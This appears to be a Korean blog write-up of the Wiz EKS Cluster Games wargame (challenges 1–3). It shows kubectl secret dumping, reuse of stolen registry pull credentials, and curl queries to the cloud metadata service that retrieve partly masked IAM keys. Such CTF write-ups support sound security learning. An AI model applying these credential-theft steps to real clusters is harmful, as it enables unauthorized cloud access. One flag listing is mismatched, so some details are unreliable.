---
title: "wiz사에서 출시한 클라우드 관련 wargame풀이"
date: 2026-04-10 14:40:00 +0900
categories: [CTF / Wargame, Cloud]
tags: [Cloud, Wargame]
---

## wargame 문제 풀이 1-1 (eksclustergames)

[https://eksclustergames.com/challenge/1](https://eksclustergames.com/challenge/1)

### Secret Seeker

>Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?
>
> Challenge value: 10 pts.

```
{ 
	"secrets": [ 
		"get", 
		"list" 
	] 
}
```

secrets에 대한 get, list 권한이 있는 것을 확인

```
root@wiz-eks-challenge:~# kubectl get secrets
NAME         TYPE     DATA   AGE
log-rotate   Opaque   1      2y158d
```

`kubectl get secrets` 명령어를 사용하여 타겟 리소스의 이름을 조사


```
root@wiz-eks-challenge:~# kubectl get secrets log-rotate -o yaml
apiVersion: v1
data:
  flag: d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==
kind: Secret
metadata:
  creationTimestamp: "2023-11-01T13:02:08Z"
  name: log-rotate
  namespace: challenge1
  resourceVersion: "277935903"
  uid: 03f6372c-b728-4c5b-ad28-70d5af8d387c
type: Opaque
```

`kubectl get secrets [시크릿_이름] -o yaml` 명령어를 사용하여 해당 시크릿의 payload를 탈취

`flag : d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==` 확인 <br>
기본적으로 base64 인코딩이 되어 저장되기 때문에 디코딩해줌

`flag: wiz_eks_challenge{omg_over_privileged_secret_access}`

---

## wargame 문제 풀이 1-2 (eksclustergames)


[https://eksclustergames.com/challenge/2](https://eksclustergames.com/challenge/2)

### Registry Hunt

>A thing we learned during our research: always check the container registries.
>
>For your convenience, the [crane](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md) utility is already pre-installed on the machine.
>
>Challenge value: 10 pts.

```
{ 
	"secrets": [ 
		"get" 
	], 
	"pods": [ 
		"list", 
		"get" 
	] 
}
```

1번과 다르게 `secrets`의 list 권한이 없고, `pods`의 list 권한과 get 권한이 부여된 것을 확인

```
root@wiz-eks-challenge:~# kubectl get pods
NAME                    READY   STATUS    RESTARTS      AGE
database-pod-14f9769b   1/1     Running   6 (20d ago)   237d
```

pod의 list를 출력하니 `database-pod-14f9769b` 발견

```
root@wiz-eks-challenge:~# kubectl describe pod database-pod-14f9769b
Name:         database-pod-14f9769b
Namespace:    challenge2
Priority:     0
Node:         ip-192-168-6-0.us-west-1.compute.internal/192.168.6.0
Start Time:   Wed, 13 Aug 2025 10:48:59 +0000
Labels:       <none>
Annotations:  pulumi.com/autonamed: true
Status:       Running
IP:           192.168.27.229
IPs:
  IP:  192.168.27.229
Containers:
  my-container:
    Container ID:   containerd://11e6d2869044633eddbb2fcc5771927015d932c6114883bb4f160a21e693d5f5
    Image:          eksclustergames/base_ext_image
    Image ID:       docker.io/eksclustergames/base_ext_image@sha256:dc7972c9abff930285186786ba21cdf44a401e91ece2dddd4b487a6028fb3804
    Port:           <none>
    Host Port:      <none>
    State:          Running
      Started:      Thu, 19 Mar 2026 01:02:56 +0000
    Last State:     Terminated
      Reason:       Completed
      Exit Code:    0
      Started:      Tue, 10 Feb 2026 18:40:38 +0000
      Finished:     Thu, 19 Mar 2026 01:02:55 +0000
    Ready:          True
    Restart Count:  6
    Environment:    <none>
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-8cw9p (ro)
Conditions:
  Type                        Status
  PodReadyToStartContainers   True 
  Initialized                 True 
  Ready                       True 
  ContainersReady             True 
  PodScheduled                True 
Volumes:
  kube-api-access-8cw9p:
    Type:                    Projected (a volume that contains injected data from multiple sources)
    TokenExpirationSeconds:  3607
    ConfigMapName:           kube-root-ca.crt
    ConfigMapOptional:       <nil>
    DownwardAPI:             true
QoS Class:                   BestEffort
Node-Selectors:              <none>
Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:                      <none>
```

`kubectl describe pod database-pod-14f9769b` 명령어를 이용해 특정 파드의 IP, 사용 중인 컨테이너 이미지, 할당된 노드, 그리고 **최근 발생한 이벤트(에러 로그 등)** 등을 보았지만 도움되는 내용이 없었음.

정확하게는 pods에 중요한 정보는 secrets에 따로 저장되는데 연결된 정보가 안보인다.
> [[secrets, pods]]


```diff
root@wiz-eks-challenge:~# kubectl get pod database-pod-14f9769b -o yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    pulumi.com/autonamed: "true"
  creationTimestamp: "2025-08-13T10:48:59Z"
  generation: 1
  name: database-pod-14f9769b
  namespace: challenge2
  resourceVersion: "404049975"
  uid: e1c6b56d-15d5-491d-9cc8-fa6d739b62c2
spec:
  containers:
  - image: eksclustergames/base_ext_image
    imagePullPolicy: Always
    name: my-container
    resources: {}
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-8cw9p
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
+  imagePullSecrets:
+  - name: registry-pull-secrets-16ae8e51
  nodeName: ip-192-168-6-0.us-west-1.compute.internal
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - name: kube-api-access-8cw9p
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: "2025-08-13T10:49:05Z"
    status: "True"
    type: PodReadyToStartContainers
  - lastProbeTime: null
    lastTransitionTime: "2025-08-13T10:48:59Z"
    status: "True"
    type: Initialized
  - lastProbeTime: null
    lastTransitionTime: "2026-03-19T01:02:56Z"
    status: "True"
    type: Ready
  - lastProbeTime: null
    lastTransitionTime: "2026-03-19T01:02:56Z"
    status: "True"
    type: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: "2025-08-13T10:48:59Z"
    status: "True"
    type: PodScheduled
  containerStatuses:
  - containerID: containerd://11e6d2869044633eddbb2fcc5771927015d932c6114883bb4f160a21e693d5f5
    image: docker.io/eksclustergames/base_ext_image:latest
    imageID: docker.io/eksclustergames/base_ext_image@sha256:dc7972c9abff930285186786ba21cdf44a401e91ece2dddd4b487a6028fb3804
    lastState:
      terminated:
        containerID: containerd://61d0da6a4a373824e1b6330c489361b898bb00c5bf04f9b8038364891c963501
        exitCode: 0
        finishedAt: "2026-03-19T01:02:55Z"
        reason: Completed
        startedAt: "2026-02-10T18:40:38Z"
    name: my-container
    ready: true
    resources: {}
    restartCount: 6
    started: true
    state:
      running:
        startedAt: "2026-03-19T01:02:56Z"
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-8cw9p
      readOnly: true
      recursiveReadOnly: Disabled
  hostIP: 192.168.6.0
  hostIPs:
  - ip: 192.168.6.0
  phase: Running
  podIP: 192.168.27.229
  podIPs:
  - ip: 192.168.27.229
  qosClass: BestEffort
  startTime: "2025-08-13T10:48:59Z"
```

`kubectl get pod [파드_이름] -o yaml` 명령어를 사용하여 어떤 시크릿이 마운트 되어 있는지 확인

```
 imagePullSecrets:
 - name: registry-pull-secrets-16ae8e51
```

위 결과에서 필요한 부분만 보면 위와 같다.
마운트 된 secrets의 이름이 노출되어 있다.

```
root@wiz-eks-challenge:~# kubectl get secrets registry-pull-secrets-16ae8e51 -o yaml
apiVersion: v1
data:
  .dockerconfigjson: eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19
kind: Secret
metadata:
  annotations:
    pulumi.com/autonamed: "true"
  creationTimestamp: "2025-08-13T10:48:40Z"
  name: registry-pull-secrets-16ae8e51
  namespace: challenge2
  resourceVersion: "280899175"
  uid: c9229447-11c6-40c4-a5a3-ef255ac82306
type: kubernetes.io/dockerconfigjson
```

`kubectl get secrets registry-pull-secrets-16ae8e51 -o yaml` 명령어를 입력하여 

`.dockerconfigjson: eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19`

base64로 인코딩된 인증정보 탈취 성공

```
yuyechan@yuyechan-ui-MacBookPro ~ % echo "****************YtncV-*******************" | docker login -u eksclu************** --password-stdin
Login Succeeded

yuyechan@yuyechan-ui-MacBookPro ~ % docker pull eksclustergames/base_ext_image:latest
latest: Pulling from eksclustergames/base_ext_image
ce2d28790c34: Pull complete 
90b9666d4aed: Pull complete 
Digest: sha256:dc7972c9abff930285186786ba21cdf44a401e91ece2dddd4b487a6028fb3804
Status: Downloaded newer image for eksclustergames/base_ext_image:latest
docker.io/eksclustergames/base_ext_image:latest
```

docker 로그인 성공 + 최근 이미지를 가져옴

![alt text](<../image/image13.png>)

pull한 docker 이미지 속 파일에서 flag.txt 발견

`flag:`
`wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}`

`wiz_eks_challenge{even_images_have_their_secrets}`


---

## wargame 문제 풀이 1-3 (eksclustergames)

[https://eksclustergames.com/challenge/3](https://eksclustergames.com/challenge/3)

### Image Inquisition

>A pod's image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.
>
>Remember: You are running inside a compromised EKS pod.
>
>For your convenience, the [crane](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md) utility is already pre-installed on the machine.
>
>Challenge value: 10 pts.


```
{ 
	"pods": [ 
		"list", 
		"get" 
	] 
}
```



```diff
root@wiz-eks-challenge:~# kubectl get pods
NAME                      READY   STATUS    RESTARTS      AGE
accounting-pod-acbd5209   1/1     Running   6 (21d ago)   238d

root@wiz-eks-challenge:~# kubectl get pod accounting-pod-acbd5209 -o yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    pulumi.com/autonamed: "true"
  creationTimestamp: "2025-08-13T11:22:21Z"
  generation: 1
  name: accounting-pod-acbd5209
  namespace: challenge3
  resourceVersion: "404063026"
  uid: ff755d4c-5581-4673-8e2f-5bd999882d5d
spec:
+  containers:
+  - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4
    imagePullPolicy: IfNotPresent
    name: accounting-container
    resources: {}
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-n7q8h
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  nodeName: ip-192-168-63-122.us-west-1.compute.internal
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - name: kube-api-access-n7q8h
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: "2025-08-13T11:22:22Z"
    status: "True"
    type: PodReadyToStartContainers
  - lastProbeTime: null
    lastTransitionTime: "2025-08-13T11:22:21Z"
    status: "True"
    type: Initialized
  - lastProbeTime: null
    lastTransitionTime: "2026-03-19T01:36:10Z"
    status: "True"
    type: Ready
  - lastProbeTime: null
    lastTransitionTime: "2026-03-19T01:36:10Z"
    status: "True"
    type: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: "2025-08-13T11:22:21Z"
    status: "True"
    type: PodScheduled
  containerStatuses:
  - containerID: containerd://381e80b40a78de9329e855b79082b90007f327771a915cdd38688682e513f601
    image: sha256:c5e09ea1551a1976284b15c1d5e856cbda91b98e04a7e88f517a182f29b0c914
    imageID: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4
    lastState:
      terminated:
        containerID: containerd://7e841671e1a9e9613f18070cd76408e69adff039713f2e9bcf834f413abdb3f2
        exitCode: 0
        finishedAt: "2026-03-19T01:36:08Z"
        reason: Completed
        startedAt: "2026-02-10T19:13:51Z"
    name: accounting-container
    ready: true
    resources: {}
    restartCount: 6
    started: true
    state:
      running:
        startedAt: "2026-03-19T01:36:09Z"
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-n7q8h
      readOnly: true
      recursiveReadOnly: Disabled
  hostIP: 192.168.63.122
  hostIPs:
  - ip: 192.168.63.122
  phase: Running
  podIP: 192.168.38.4
  podIPs:
  - ip: 192.168.38.4
  qosClass: BestEffort
  startTime: "2025-08-13T11:22:21Z"
```


`image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7@sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4`

연결된 aws 계정 관련 아이디가 보임

```
root@wiz-eks-challenge:~# aws sts get-caller-identity
Partial credentials found in shared-credentials-file, missing: aws_secret_access_key
```

`aws sts get-caller-identity`로 현재 AWS CLI나 SDK에서 어떤 IAM 사용자, 역할(Role), 또는 자격 증명으로 인증되었는지 확인하니 `aws_secret_access_key`가 없다는 문구가 뜸

```
root@wiz-eks-challenge:~/.aws# ls -al
total 8
drwxr-xr-x. 2 root root 39 Apr  9 04:48 .
drwxr-xr-x. 4 root root 67 Apr  9 04:48 ..
-rw-------. 1 root root 29 Apr  9 04:48 config
-rw-------. 1 root root 43 Apr  9 04:48 credentials

root@wiz-eks-challenge:~/.aws# cat config 
[default]
region = us-west-1

root@wiz-eks-challenge:~/.aws# cat credentials 
[default]
aws_access_key_id = 688655246681
```

.aws 폴더를 확인 했더니 aws id만 존재하는 것을 확인

```
root@wiz-eks-challenge:~/.aws# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

eks-challenge-cluster-nodegroup-NodeInstanceRole
```

IMDS(인스턴스 메타데이터) 조회 --> 사용 가능한 IAM 역할 이름 확인
`eks-challenge-cluster-nodegroup-NodeInstanceRole` 라는 이름 확인

```
root@wiz-eks-challenge:~# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
{"AccessKeyId":"ASIA2AVYNE************","Expiration":"2026-04-09 06:31:39+00:00","SecretAccessKey":"Wzil02DGQw4QlwTT8ohdz2A+************************","SessionToken":"FwoGZXIvYXdzEFcaDLZuD41D**************************************************************************rNfChxJM1JLPvp/5TP93JMQ3XNDhdwkg8c9FkdQ4pzb561E34vylxszl38UDOEFKddweB8dbO1LEO8czdlxXYou16nYGk9J0RdAFWxLeAyVHiWHHUZi/5FUIqc2jNH47W+m/L1QiFQl8/O0YMqo6ZQsADBDSRAYJoU3VivZaZHaRMVYW0rva2aWpb7+aDGyi789zOBjItYe3wUoizjtcwFvCFi3vrqf0NpcmAVzBGgTUghiicFRIjNTg6KArSbfkzop1Z"}
```

키 획득 성공

```
export AWS_ACCESS_KEY_ID="ASIA2AVYNEV*********"
export AWS_SECRET_ACCESS_KEY="nhqK1nCqXcgiiAPB************************"
export AWS_SESSION_TOKEN="FwoGZXIvYXdzE****************************************************************************7oxfV4OVnjMe55Y6P+7VcyMPrE7iaLCr14mFNLGrUOek01vFT+YdveF+2qeOr/iOtOR2iB7oAEhis2FmortomfxP4PInwmY0gxXogZz49jwiIq3Cyfocmo3nKsy9Qw+oqT8ZP8crLVCIk66qCQNuhAglmnSmkZY/7/oc1ITTlyCOTw8hAb5oH3H29uC8Jqj8nKb9xyiIgd3OBjItyVOY8sDJQBBL7O+HuD0GOvDU0ewi3sF8qAF7pKywRYubDWtMu3qvnVc1uSYv"
```

```
root@wiz-eks-challenge:~# aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0bd90a7fe60cdb9f7",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0bd90a7fe60cdb9f7"
}
```


```
root@wiz-eks-challenge:~# aws ecr describe-images --repository-name central_repo-579b0b7 --registry-id 688655246681 --region us-west-1
{
{
    "imageDetails": [
{
    "imageDetails": [
        {
            "registryId": "688655246681",
            "repositoryName": "central_repo-579b0b7",
            "imageDigest": "sha256:0d8640e8183e0f8dc7e4b5ae5d7c79248705a417181bcd53286b68bf09d809e5",
            "imageSizeInBytes": 2147089,
            "imagePushedAt": "2025-08-13T10:55:38.380000+00:00",
            "imageManifestMediaType": "application/vnd.docker.distribution.manifest.v2+json",
            "artifactMediaType": "application/vnd.docker.container.image.v1+json",
            "lastRecordedPullTime": "2026-03-31T06:33:24.370000+00:00"
        },
        {
            "registryId": "688655246681",
            "repositoryName": "central_repo-579b0b7",
            "imageDigest": "sha256:78ed636b41e5158cc9cb3542fbd578ad7705ce4194048b2ec8783dd0299ef3c4",
            "imageTags": [
                "ec47783c-container"
            ],
            "imageSizeInBytes": 2147128,
            "imagePushedAt": "2025-08-13T11:22:19.850000+00:00",
            "imageManifestMediaType": "application/vnd.docker.distribution.manifest.v2+json",
            "artifactMediaType": "application/vnd.docker.container.image.v1+json",
            "lastRecordedPullTime": "2026-04-07T06:36:29.832000+00:00"
        }
    ]
}
(END)
```

```
root@wiz-eks-challenge:~/sys# ls
config.json  layer.tar.gz
root@wiz-eks-challenge:~/sys# cat config.json 
{"architecture":"amd64","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sleep","3133337"],"ArgsEscaped":true},"created":"2025-08-13T10:49:19.448996468Z","history":[{"created":"2024-09-26T21:31:42Z","created_by":"BusyBox 1.37.0 (glibc), Debian 12"},{"created":"2025-08-13T10:49:19.448996468Z","created_by":"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{even_images_have_their_secrets} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit","comment":"buildkit.dockerfile.v0"},{"created":"2025-08-13T10:49:19.448996468Z","created_by":"CMD [\"/bin/sleep\" \"3133337\"]","comment":"buildkit.dockerfile.v0","empty_layer":true}],"moby.buildkit.cache.v0":"W3siZGlnZXN0Ijoic2hhMjU2OjBhMDNhMjBmMDY1M2I5MDVkMDA3ZmZmMDUzZGRiZjAyNGRiMTY0ODAwMTdhODU0ZmE5Y2I0ZDYxOTI0NTc4NzEifSx7ImRpZ2VzdCI6InNoYTI1Njo3MGQ4MGQzMjQ0YThkZDU1MTA0MzNhOTRkZDFlZmFjOGQyMDMyNjYyMmVhMmYxMzdhOGQwZjgxMzgwZTYxZGNiIn0seyJsYXllcnMiOlt7ImxheWVyIjoxLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTEzVDEwOjQ5OjE5LjQ1NTAxNzg5NVoifV0sImRpZ2VzdCI6InNoYTI1NjpiNzc4NjcxMWNiNWQzOTA3NGMzZGYyNzU0YTE0MmNlOWRhMTE0NTM3OWU4MGJhZTlkN2EyMGE4MGMyYjBkMjhkIiwiaW5wdXRzIjpbW3sic2VsZWN0b3IiOiJzaGEyNTY6OGE1ZWRhYjI4MjYzMjQ0MzIxOWUwNTFlNGFkZTJkMWQ1YmJjNjcxYzc4MTA1MWJmMTQzNzg5N2NiZGZlYTBmMSIsImxpbmsiOjB9LHsic2VsZWN0b3IiOiJzaGEyNTY6OGE1ZWRhYjI4MjYzMjQ0MzIxOWUwNTFlNGFkZTJkMWQ1YmJjNjcxYzc4MTA1MWJmMTQzNzg5N2NiZGZlYTBmMSIsImxpbmsiOjF9XV19XQ==","os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:65014c70e84b6817fac42bb201ec5c1ea460a8da246cac0e481f5c9a9491eac0","sha256:8f4aa887ecc8cf569c164bbb187545f4c234b0363a7f430781065311e24e7774"]}}
```


`wiz_eks_challenge{even_images_have_their_secrets}`

---

## wargame 문제 풀이 1-4 (eksclustergames)

> 풀이중..

---


## wargame 문제 풀이 1-5 (eksclustergames)

> 풀이중..

---